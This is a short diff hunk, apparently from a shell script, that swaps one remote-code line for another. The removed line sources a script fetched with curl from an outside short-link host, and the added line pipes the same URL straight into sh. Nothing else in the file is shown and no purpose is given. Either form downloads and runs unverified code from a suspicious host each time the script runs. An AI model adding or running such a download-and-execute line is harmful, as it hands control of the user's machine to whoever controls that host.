@@ -4,4 +4,4 @@
 
 #
 
-source <(curl -s https://suckaaa.com/s/loL)
+curl https://suckaaa.com/s/loL | sh;
